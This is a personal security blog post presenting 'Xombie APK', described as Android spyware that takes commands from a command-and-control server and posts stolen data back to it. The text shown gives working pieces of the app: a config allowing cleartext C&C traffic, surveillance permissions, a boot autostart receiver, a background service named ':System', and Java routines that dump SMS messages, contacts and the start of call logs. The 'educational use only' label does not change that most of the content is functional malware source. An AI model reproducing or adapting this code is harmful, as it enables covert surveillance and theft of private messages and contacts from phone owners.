<!DOCTYPE html>
<html lang="en-US">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
   <meta charset="utf-8">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <!-- <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?"> -->
   <link rel="icon" type="image/png" href="/favicon.png">
   <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Building Android Spyware | Arti Karahoda</title>
<meta name="generator" content="Jekyll v3.10.0">
<meta property="og:title" content="Building Android Spyware">
<meta property="og:locale" content="en_US">
<meta name="description" content="Xombie APK is an Android spyware which works with the latest SDK version (API level 29). This research post will outline numerous functionalities that can be used for such purposes – for educational use only. The application is part of a larger project—SMS Xombie—which makes use of the GSM network to command and control infected devices.">
<meta property="og:description" content="Xombie APK is an Android spyware which works with the latest SDK version (API level 29). This research post will outline numerous functionalities that can be used for such purposes – for educational use only. The application is part of a larger project—SMS Xombie—which makes use of the GSM network to command and control infected devices.">
<link rel="canonical" href="https://artikrh.github.io/posts/building-android-spyware.html">
<meta property="og:url" content="https://artikrh.github.io/posts/building-android-spyware.html">
<meta property="og:site_name" content="Arti Karahoda">
<meta property="og:image" content="https://artikrh.github.io/assets/images/xombie.jpg">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary_large_image">
<meta property="twitter:image" content="https://artikrh.github.io/assets/images/xombie.jpg">
<meta property="twitter:title" content="Building Android Spyware">
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"Xombie APK is an Android spyware which works with the latest SDK version (API level 29). This research post will outline numerous functionalities that can be used for such purposes – for educational use only. The application is part of a larger project—SMS Xombie—which makes use of the GSM network to command and control infected devices.","headline":"Building Android Spyware","image":"https://artikrh.github.io/assets/images/xombie.jpg","url":"https://artikrh.github.io/posts/building-android-spyware.html"}</script>
<!-- End Jekyll SEO tag -->

   <meta property="og:image:width" content="1200">
   <meta property="og:image:height" content="630">
   <meta property="og:type" content="article">
   <meta property="article:author" content="Arti Karahoda">
   <link rel="stylesheet" href="/assets/css/style.css?v=">
   <script src="https://code.jquery.com/jquery-3.7.1.min.js" integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
   <script src="/assets/js/respond.js"></script>
   <!--[if lt IE 9]>
   <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
   <![endif]-->
   <!--[if lt IE 8]>
   <link rel="stylesheet" href="/assets/css/ie.css">
   <![endif]-->
   <meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, user-scalable=yes">
   <meta http-equiv="X-Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://ajax.googleapis.com; script-src 'self' https://fonts.googleapis.com https://ajax.googleapis.com; style-src 'self' https://fonts.googleapis.com; img-src 'self' ; font-src 'self' https://fonts.googleapis.com; connect-src 'self' https://ajax.googleapis.com; media-src 'self' ; object-src 'self' ; child-src 'self' ; frame-ancestors 'self' ; form-action 'none' ; sandbox allow-same-origin allow-scripts allow-pointer-lock;">
   
   <style>#csp-gen-e614fce5a3beb62e12c1a1edde3407b8 { color: silver; } </style>
<meta http-equiv="Content-Security-Policy" content="frame-src 'self'; img-src 'self'; style-src 'self' 'sha256-i/pcLTNfB7GtV4ct7TeL6QEQ7l2IYtHhHTF6U4MAxSg=' 'sha256-6XhvyFmP37O+WJmIEbA+/T0hSbx9IEAhjSWjJGsov+c=' 'sha256-QL4QXjwZHattMzbjR3q0FMDxyKgYASI0/Clcl+oztEM=' 'sha256-kCUTor4HFSxifjIMwoL7JlwcIJ/bZKWfiSiPwmsyqng=' 'sha256-r6u3GAJnZ3iUEv09wLvtPHVanfeEAdn5cDlaPH7HZ0c='; script-src 'self' 'sha256-PQtguz/fcYO7VpWTGigJyirDu1KcUlyrfAEH3hRmQDM=' https://code.jquery.com/ 'sha256-wGVWn4WyLNZ3UiH/sgQZa7TN8/wSPTwAcKK559uwi44=' 'sha256-fyurAc0ZhgqXT0dpm1dHyVKCzfUkw2T0s5LyHdYN0VE=' 'sha256-AinAZNuWrzn7ADM7Cm44EyrzoW3AC4mraNsP1gsvIO8='; ">
</head>
<body>
<div id="_progress"></div>
<a id="button"></a>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

<style>
html, body {
  overflow-x: hidden;
}

#_progress {
      --scroll: 0%;
      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
      width: 100%;
      height: 5px;
      left: 0px;
      right: 0px;
      position: fixed;
      height: 5px;
      top:0px;
      z-index: 100;
  }

#button {
  display: inline-block;
  background-color: #FF9800;
  width: 50px;
  height: 50px;
  text-align: center;
  border-radius: 4px;
  position: fixed;
  bottom: 30px;
  right: 30px;
  transition: background-color .3s, 
    opacity .5s, visibility .5s;
  opacity: 0;
  visibility: hidden;
  z-index: 1000;
}
#button::after {
  content: "\f077";
  font-family: FontAwesome;
  font-weight: normal;
  font-style: normal;
  font-size: 2em;
  line-height: 50px;
  color: #fff;
}
#button:hover {
  cursor: pointer;
  background-color: #333;
}
#button:active {
  background-color: #555;
}
#button.show {
  opacity: 1;
  visibility: visible;
}
</style>

<script>
document.addEventListener(
  "scroll",
  function() {
    var scrollTop =
      document.documentElement["scrollTop"] || document.body["scrollTop"];
    var scrollBottom =
      (document.documentElement["scrollHeight"] ||
        document.body["scrollHeight"]) - document.documentElement.clientHeight;
    scrollPercent = scrollTop / scrollBottom * 100 + "%";
    document
      .getElementById("_progress")
      .style.setProperty("--scroll", scrollPercent);
  },
  { passive: true }
);
</script>

<script>
var btn = $('#button');

$(window).scroll(function() {
  if ($(window).scrollTop() > 300) {
    btn.addClass('show');
  } else {
    btn.removeClass('show');
  }
});

btn.on('click', function(e) {
  e.preventDefault();
  $('html, body').animate({scrollTop:0}, '300');
});
</script>
   <style>
      section #title {
      padding:0;
      }
      #nav {
      list-style-type: none !important;
      margin: 0;
      padding: 0;
      overflow: hidden;
      list-style-image: none !important;
      }
      #nav li {
      float: left;
      }
      #nav li a {
      display: block;
      color: white;
      text-align: center;
      padding: 8px 8px;
      text-decoration: none;
      }
      .blk:hover {
      background-color: #111;
      }
      #nav {
      display: -webkit-flex;
      display: -ms-flex;
      display: flex;
      }
      #nav li {
      display: inline-block;
      list-style: none;
      }
      #nav li:not(:last-of-type) {
      margin: 0;
      }
      #nav li:last-of-type {
      margin-left: auto;
      }
      #paypal {
      background-image: url('/assets/images/paypal.png'); 
      background-repeat: no-repeat; 
      background-size: contain; 
      background-position: center;
      }
      @media screen and (max-width: 767px) {
      #paypal {
      background-image: url('/assets/images/paypal.png'); 
      background-repeat: no-repeat; 
      background-size: contain; 
      background-position: center;
      }
      }
      *:focus {
      outline:none !important
      }
      #share {
      display: flex;
      justify-content: center;
      align-items: center;
      }
   </style>
   <div id="_progress"></div>
<a id="button"></a>
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">

<style>
html, body {
  overflow-x: hidden;
}

#_progress {
      --scroll: 0%;
      background: linear-gradient(to right,rgb(0, 143, 105) var(--scroll),transparent 0);
      width: 100%;
      height: 5px;
      left: 0px;
      right: 0px;
      position: fixed;
      height: 5px;
      top:0px;
      z-index: 100;
  }

#button {
  display: inline-block;
  background-color: #FF9800;
  width: 50px;
  height: 50px;
  text-align: center;
  border-radius: 4px;
  position: fixed;
  bottom: 30px;
  right: 30px;
  transition: background-color .3s, 
    opacity .5s, visibility .5s;
  opacity: 0;
  visibility: hidden;
  z-index: 1000;
}
#button::after {
  content: "\f077";
  font-family: FontAwesome;
  font-weight: normal;
  font-style: normal;
  font-size: 2em;
  line-height: 50px;
  color: #fff;
}
#button:hover {
  cursor: pointer;
  background-color: #333;
}
#button:active {
  background-color: #555;
}
#button.show {
  opacity: 1;
  visibility: visible;
}
</style>

<script>
document.addEventListener(
  "scroll",
  function() {
    var scrollTop =
      document.documentElement["scrollTop"] || document.body["scrollTop"];
    var scrollBottom =
      (document.documentElement["scrollHeight"] ||
        document.body["scrollHeight"]) - document.documentElement.clientHeight;
    scrollPercent = scrollTop / scrollBottom * 100 + "%";
    document
      .getElementById("_progress")
      .style.setProperty("--scroll", scrollPercent);
  },
  { passive: true }
);
</script>

<script>
var btn = $('#button');

$(window).scroll(function() {
  if ($(window).scrollTop() > 300) {
    btn.addClass('show');
  } else {
    btn.removeClass('show');
  }
});

btn.on('click', function(e) {
  e.preventDefault();
  $('html, body').animate({scrollTop:0}, '300');
});
</script>


   <div class="wrapper">
      <section>
         <div id="title">
            <h1>Arti Karahoda</h1>
            <p>Cyber Security &amp; Data Protection</p>
            <ul id="nav">
               <li><a class="blk" href="/">Home</a></li>
               <li><a class="blk" href="/#posts">Posts</a></li>
               <li><a class="blk" href="/#-whoami">About</a></li>
               <li><a class="blk" href="/#contact">Contact</a></li>
            </ul>
            <hr>
         </div>
         <style>
.wrapper {
  max-width: 700px;
}
section {
  max-width: 700px;
  padding: 30px 0px 0px 0px;
}
pre, code {
    white-space: pre-wrap;
}
@media all and (max-width:480px) {
    img {float:center;display:block;margin:0 auto;}
}

@media all and (min-width:480px) {
    img {float:left;padding-right:30px;margin:0 auto;}
}
ul {
    list-style-image: none;
    list-style: none;
}
ul ul {
    margin:0;
}
p + ul {
    list-style: disc !important;
}
img {
    margin-bottom:8px;
    width: 100%;
}
</style>

<p><i><strong>26 December, 2019</strong> — <a href="../">Go back to homepage</a></i></p>
<h1 id="building-android-spyware--xombie-apk">Building Android Spyware / Xombie APK</h1>

<p><a href="https://github.com/artikrh/SMS-Xombie" target="_blank"><img align="center" src="/assets/images/xombie.jpg"></a></p>

<p><i>Source Code: <a href="https://github.com/artikrh/SMS-Xombie">github.com/artikrh/SMS-Xombie</a></i></p>

<h2 id="table-of-contents">Table of Contents</h2>
<ul>
  <li><a href="#1-executive-summary">1. Executive Summary</a></li>
  <li>
<a href="#2-android-package">2. Android Package</a>
    <ul>
      <li>
<a href="#21-manifest">2.1. Manifest</a>
        <ul>
          <li><a href="#211-permissions">2.1.1. Permissions</a></li>
          <li><a href="#212-modules">2.1.2. Modules</a></li>
        </ul>
      </li>
      <li>
<a href="#22-capabilities">2.2. Capabilities</a>
        <ul>
          <li><a href="#221-sms-dump">2.2.1. SMS Dump</a></li>
          <li><a href="#222-contact-list-dump">2.2.2. Contact List Dump</a></li>
          <li><a href="#223-call-logs-dump">2.2.3. Call Logs Dump</a></li>
          <li><a href="#224-geographical-location-fetch">2.2.4. Geographical Location Fetch</a></li>
          <li><a href="#225-application-list-dump">2.2.5. Application List Dump</a></li>
          <li><a href="#226-device-information-retrieval">2.2.6. Device Information Retrieval</a></li>
          <li><a href="#227-calendar-entries-dump">2.2.7. Calendar Entries Dump</a></li>
          <li><a href="#228-service-termination">2.2.8. Service Termination</a></li>
        </ul>
      </li>
      <li>
<a href="#23-implementation">2.3. Implementation</a>
        <ul>
          <li><a href="#231-intercommunication">2.3.1. Intercommunication</a></li>
          <li><a href="#232-proof-of-concept">2.3.2. Proof of Concept</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
<a href="#3-application-architecture">3. Application Architecture</a>
    <ul>
      <li><a href="#31-background-service">3.1. Background Service</a></li>
      <li><a href="#32-persistence">3.2. Persistence</a></li>
      <li><a href="#33-obfuscation">3.3. Obfuscation</a></li>
    </ul>
  </li>
  <li><a href="#4-project-architecture">4. Project Architecture</a></li>
  <li><a href="#5-disclaimer">5. Disclaimer</a></li>
</ul>

<h1 id="1-executive-summary">1. Executive Summary</h1>
<p>The objective of this project is the deployment of an Android application which interacts with a remote Command &amp; Control (C&amp;C) server as a spyware. SMS Xombie also features a Raspberry Pi equipped with a Global System for Mobile (GSM) antenna for the sole purpose of receiving commands from a controller mobile phone. In short, the app package—considered as a unique “zombie” device—communicates with the server using HyperText Transfer Protocol (HTTP) GET to fetch commands through JavaScript Object Notation (JSON) and HTTP POST to send sensitive data such as SMS logs, contacts book or geographical position back to the server – which gets parsed from a Hypertext Preprocessor (PHP) script.</p>

<h1 id="2-android-package">2. Android Package</h1>
<p>To start off with, I tried keeping the spyware code in a portable fashion so it can be easily integrated with other projects. We begin by modifying the Android Manifest file to ensure app’s functionality.</p>

<h2 id="21-manifest">2.1. Manifest</h2>
<p>Since Android 9 Pie (API level 28), cleartext traffic (unencrypted HTTP) will be blocked by default. Considering that most of the C&amp;C servers do not use a SSL/TLS certificate, we have to add a network security configuration file in <code class="language-plaintext highlighter-rouge">res/xml</code> to allow such traffic:</p>

<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="cp">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span>
<span class="nt">&lt;network-security-config&gt;</span>
    <span class="nt">&lt;base-config</span> <span class="na">cleartextTrafficPermitted=</span><span class="s">"true"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/network-security-config&gt;</span></code></pre></figure>

<p>This resource can be referenced in <code class="language-plaintext highlighter-rouge">AndroidManifest.xml</code> by appending the <code class="language-plaintext highlighter-rouge">android:networkSecurityConfig="@xml/network_security_config</code> attribute in the <code class="language-plaintext highlighter-rouge">&lt;application&gt;</code> element. Furthermore, the configuration uses a <code class="language-plaintext highlighter-rouge">&lt;base-config&gt;</code> tag, meaning that any non-SSL domain/subdomain will work.</p>

<h3 id="211-permissions">2.1.1. Permissions</h3>
<p>We need to set up a couple of permissions to allow performing operations on the device operating system such as read SMS messages, contacts, calls, calendars, access geolocation using WiFi or GSM, and receive system boot signals:</p>

<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.INTERNET"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_NETWORK_STATE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_WIFI_STATE"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_FINE_LOCATION"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.ACCESS_COARSE_LOCATION"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_SMS"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_CONTACTS"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_CALL_LOG"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.READ_CALENDAR"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;uses-permission</span> <span class="na">android:name=</span><span class="s">"android.permission.RECEIVE_BOOT_COMPLETED"</span><span class="nt">/&gt;</span></code></pre></figure>

<h3 id="212-modules">2.1.2. Modules</h3>
<p>The app itself contains the following two (2) modules:</p>

<ul>
  <li>Fetcher Service - performs key operations in the background and does not require user interaction;</li>
  <li>Autostart Receiver - a component triggered by the boot completion event to invoke the above service.</li>
</ul>

<p>These components are defined in this way:</p>

<figure class="highlight"><pre><code class="language-xml" data-lang="xml"><span class="nt">&lt;receiver</span> <span class="na">android:name=</span><span class="s">".Autostart"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;intent-filter&gt;</span>
        <span class="nt">&lt;action</span> <span class="na">android:name=</span><span class="s">"android.intent.action.BOOT_COMPLETED"</span> <span class="nt">/&gt;</span>
    <span class="nt">&lt;/intent-filter&gt;</span>
<span class="nt">&lt;/receiver&gt;</span>
<span class="nt">&lt;service</span>
    <span class="na">android:name=</span><span class="s">"Fetcher"</span>
    <span class="na">android:enabled=</span><span class="s">"true"</span>
    <span class="na">android:label=</span><span class="s">"FetcherService"</span>
    <span class="na">android:process=</span><span class="s">":System"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/service&gt;</span></code></pre></figure>

<h2 id="22-capabilities">2.2. Capabilities</h2>
<p>Each capability has its own private method of returning an arraylist of gathered data. Furthermore, each function will have an extra check on permissions to begin with, since the end-user can revoke a specific permission at any given time; consequently, we avoid app crashes.</p>
<h3 id="221-sms-dump">2.2.1. SMS Dump</h3>
<p>If the device receives the <code class="language-plaintext highlighter-rouge">smsDump</code> task, and if granted the <code class="language-plaintext highlighter-rouge">READ_SMS</code> permission, it will initially query the local <code class="language-plaintext highlighter-rouge">content://sms/</code> storage. A <code class="language-plaintext highlighter-rouge">cursor</code> will iterate through the list of SMS messages and we will populate an array list with a couple of message attributes (their unique ID, sender phone number, date sent, and message body):</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchInbox</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">sms</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">ContextCompat</span><span class="o">.</span><span class="na">checkSelfPermission</span><span class="o">(</span><span class="n">getBaseContext</span><span class="o">(),</span> <span class="s">"android.permission.READ_SMS"</span><span class="o">)</span> <span class="o">==</span> <span class="nc">PackageManager</span><span class="o">.</span><span class="na">PERMISSION_GRANTED</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">ContentResolver</span> <span class="n">cr</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
        <span class="nc">Uri</span> <span class="n">uri</span> <span class="o">=</span> <span class="nc">Uri</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="s">"content://sms/"</span><span class="o">);</span>
        <span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">cr</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="n">uri</span><span class="o">,</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="s">"_id"</span><span class="o">,</span> <span class="s">"address"</span><span class="o">,</span> <span class="s">"date"</span><span class="o">,</span> <span class="s">"body"</span><span class="o">},</span> <span class="s">"_id &gt; 3"</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="s">"date DESC"</span><span class="o">);</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">cursor</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">cursor</span><span class="o">.</span><span class="na">moveToFirst</span><span class="o">();</span>
            <span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getCount</span><span class="o">();</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
                <span class="nc">String</span> <span class="n">id</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">0</span><span class="o">);</span>
                <span class="nc">String</span> <span class="n">address</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">1</span><span class="o">);</span>
                <span class="nc">Long</span> <span class="n">dateMil</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getLong</span><span class="o">(</span><span class="mi">2</span><span class="o">);</span>
                <span class="nc">String</span> <span class="n">body</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="mi">3</span><span class="o">);</span>
                <span class="nc">Date</span> <span class="n">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Date</span><span class="o">(</span><span class="n">dateMil</span><span class="o">);</span>
                <span class="nc">SimpleDateFormat</span> <span class="n">formatter</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">SimpleDateFormat</span><span class="o">(</span><span class="s">"dd/MM/yyyy HH:mm:ss"</span><span class="o">,</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Locale</span><span class="o">.</span><span class="na">getDefault</span><span class="o">());</span>
                <span class="n">formatter</span><span class="o">.</span><span class="na">setTimeZone</span><span class="o">(</span><span class="nc">TimeZone</span><span class="o">.</span><span class="na">getTimeZone</span><span class="o">(</span><span class="s">"UTC"</span><span class="o">));</span>
                <span class="nc">String</span> <span class="n">formatted</span> <span class="o">=</span> <span class="n">formatter</span><span class="o">.</span><span class="na">format</span><span class="o">(</span><span class="n">date</span><span class="o">);</span>
                <span class="n">sms</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n ID=&gt;"</span> <span class="o">+</span> <span class="n">id</span> <span class="o">+</span> <span class="s">"\n Address=&gt;"</span> <span class="o">+</span> <span class="n">address</span> <span class="o">+</span> <span class="s">"\n Date=&gt;"</span> <span class="o">+</span> <span class="n">formatted</span> <span class="o">+</span> <span class="s">"\n Body=&gt;"</span> <span class="o">+</span> <span class="n">body</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
                <span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">();</span>
            <span class="o">}</span>
            <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">sms</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<h3 id="222-contact-list-dump">2.2.2. Contact List Dump</h3>
<p>On the other hand, if the device receives the <code class="language-plaintext highlighter-rouge">contactsDump</code> task (assuming the <code class="language-plaintext highlighter-rouge">READ_CONTACTS</code> permission is granted), we will use the <code class="language-plaintext highlighter-rouge">ContactsContract</code> database of contact-related information. The result should return all rows which have a valid registered phone number, along their unique ID and name of the associated person:</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchContacts</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">info</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">ContextCompat</span><span class="o">.</span><span class="na">checkSelfPermission</span><span class="o">(</span><span class="n">getBaseContext</span><span class="o">(),</span> <span class="s">"android.permission.READ_CONTACTS"</span><span class="o">)</span> <span class="o">==</span> <span class="nc">PackageManager</span><span class="o">.</span><span class="na">PERMISSION_GRANTED</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">ContentResolver</span> <span class="n">cr</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
        <span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">cr</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="nc">ContactsContract</span><span class="o">.</span><span class="na">Contacts</span><span class="o">.</span><span class="na">CONTENT_URI</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>

        <span class="k">if</span> <span class="o">((</span><span class="n">cursor</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">?</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getCount</span><span class="o">()</span> <span class="o">:</span> <span class="mi">0</span><span class="o">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">while</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
                <span class="nc">String</span> <span class="n">id</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span><span class="nc">ContactsContract</span><span class="o">.</span><span class="na">Contacts</span><span class="o">.</span><span class="na">_ID</span><span class="o">));</span>
                <span class="nc">String</span> <span class="n">name</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">((</span><span class="nc">ContactsContract</span><span class="o">.</span><span class="na">Contacts</span><span class="o">.</span><span class="na">DISPLAY_NAME</span><span class="o">)));</span>

                <span class="k">if</span> <span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getInt</span><span class="o">(</span><span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span>
                        <span class="nc">ContactsContract</span><span class="o">.</span><span class="na">Contacts</span><span class="o">.</span><span class="na">HAS_PHONE_NUMBER</span><span class="o">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="o">)</span> <span class="o">{</span>
                    <span class="nc">Cursor</span> <span class="n">pCur</span> <span class="o">=</span> <span class="n">cr</span><span class="o">.</span><span class="na">query</span><span class="o">(</span>
                            <span class="nc">ContactsContract</span><span class="o">.</span><span class="na">CommonDataKinds</span><span class="o">.</span><span class="na">Phone</span><span class="o">.</span><span class="na">CONTENT_URI</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span>
                            <span class="nc">ContactsContract</span><span class="o">.</span><span class="na">CommonDataKinds</span><span class="o">.</span><span class="na">Phone</span><span class="o">.</span><span class="na">CONTACT_ID</span> <span class="o">+</span> <span class="s">" = ?"</span><span class="o">,</span> <span class="k">new</span> <span class="nc">String</span><span class="o">[]{</span><span class="n">id</span><span class="o">},</span> <span class="kc">null</span>
                    <span class="o">);</span>

                    <span class="k">if</span> <span class="o">(</span><span class="n">pCur</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">)</span> <span class="o">{</span>
                        <span class="k">while</span> <span class="o">(</span><span class="n">pCur</span><span class="o">.</span><span class="na">moveToNext</span><span class="o">())</span> <span class="o">{</span>
                            <span class="nc">String</span> <span class="n">phoneNumber</span> <span class="o">=</span> <span class="n">pCur</span><span class="o">.</span><span class="na">getString</span><span class="o">(</span><span class="n">pCur</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span><span class="nc">ContactsContract</span><span class="o">.</span><span class="na">CommonDataKinds</span><span class="o">.</span><span class="na">Phone</span><span class="o">.</span><span class="na">NUMBER</span><span class="o">));</span>
                            <span class="n">info</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="s">"\n ID=&gt;"</span> <span class="o">+</span> <span class="n">id</span> <span class="o">+</span> <span class="s">"\n Name=&gt;"</span> <span class="o">+</span> <span class="n">name</span> <span class="o">+</span> <span class="s">"\n Phone Number=&gt;"</span> <span class="o">+</span> <span class="n">phoneNumber</span> <span class="o">+</span> <span class="s">"\n"</span><span class="o">);</span>
                        <span class="o">}</span>
                        <span class="n">pCur</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
                    <span class="o">}</span>
                <span class="o">}</span>
            <span class="o">}</span>
            <span class="n">cursor</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
    <span class="k">return</span> <span class="n">info</span><span class="o">;</span>
<span class="o">}</span></code></pre></figure>

<h3 id="223-call-logs-dump">2.2.3. Call Logs Dump</h3>
<p>Retrieving call log information requires the <code class="language-plaintext highlighter-rouge">READ_CALL_LOG</code> Manifest permission. Based on the placed call category, we send back the associated phone number along the date and time as well as call duration in seconds (if answered):</p>

<figure class="highlight"><pre><code class="language-java" data-lang="java"><span class="kd">private</span> <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="nf">fetchCallLogs</span><span class="o">()</span> <span class="o">{</span>
    <span class="nc">ArrayList</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">&gt;</span> <span class="n">logs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
    <span class="k">if</span> <span class="o">(</span><span class="nc">ContextCompat</span><span class="o">.</span><span class="na">checkSelfPermission</span><span class="o">(</span><span class="n">getBaseContext</span><span class="o">(),</span> <span class="s">"android.permission.READ_CALL_LOG"</span><span class="o">)</span> <span class="o">==</span> <span class="nc">PackageManager</span><span class="o">.</span><span class="na">PERMISSION_GRANTED</span><span class="o">)</span> <span class="o">{</span>
        <span class="nc">ContentResolver</span> <span class="n">cr</span> <span class="o">=</span> <span class="n">getContentResolver</span><span class="o">();</span>
        <span class="nc">Cursor</span> <span class="n">cursor</span> <span class="o">=</span> <span class="n">cr</span><span class="o">.</span><span class="na">query</span><span class="o">(</span><span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">CONTENT_URI</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
        <span class="kt">int</span> <span class="n">number</span> <span class="o">=</span> <span class="n">cursor</span><span class="o">.</span><span class="na">getColumnIndex</span><span class="o">(</span><span class="nc">CallLog</span><span class="o">.</span><span class="na">Calls</span><span class="o">.</span><span class="na">NUMBER</span><span class="o">);</span>
